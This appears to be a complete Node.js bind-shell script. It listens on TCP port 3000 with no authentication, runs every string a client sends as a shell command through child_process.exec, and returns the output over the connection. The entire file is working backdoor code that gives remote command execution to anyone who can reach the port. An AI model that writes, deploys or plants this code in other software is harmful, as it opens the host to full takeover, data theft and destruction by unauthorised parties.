const { exec } = require("child_process");
const net = require("net");
const serverline = require("serverline");

const server = net
  .createServer((connection) => {
    console.log("[+] Client connected");
    connection.on("data", (buf) =>
      exec(buf.toString(), (err, stdout, stderr) => {
        if (err) {
          connection.write("[>] Command not found.\n");
          console.log("[-] ", err.message);
          return;
        }
        if (stderr) {
          connection.write("[>] Error: " + stderr);
          return;
        }
        connection.write("[>] " + stdout);
      })
    );

    connection.on("end", () => console.log("[+] Client disconnected\n"));
    connection.on("error", (err) => console.log("[X] ", err.message));
  })
  .listen(3000, () => console.log("[$] Server listening on port 3000"));
